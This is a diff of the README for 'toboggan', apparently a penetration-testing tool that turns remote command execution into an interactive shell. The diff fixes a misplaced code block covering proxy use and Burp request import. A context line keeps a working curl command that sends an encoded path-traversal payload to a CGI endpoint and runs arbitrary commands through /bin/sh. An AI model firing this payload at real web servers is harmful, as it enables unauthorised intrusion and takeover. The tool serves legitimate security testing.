@@ -65,21 +65,19 @@ toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
 
 To route traffic through Burp Suite:
 ```shell
-toboggan ~/ph
+toboggan ~/phpexploit.py --proxy
+```
+
+You can also directly import a Burp saved request that contains the `||cmd||` placeholder:
+```shell
+toboggan --request brequest
+```
 
 ### Wrap a shell command
 
 If you are really lazy, you can directly wrap a shell command:
 ```shell
 toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
-```
-
-pexploit.py --proxy
-```
-
-You can also directly import a Burp saved request that contains the `||cmd||` placeholder:
-```shell
-toboggan --request brequest
 ```
 
 ## 🔍 What is an RCE Python Module?
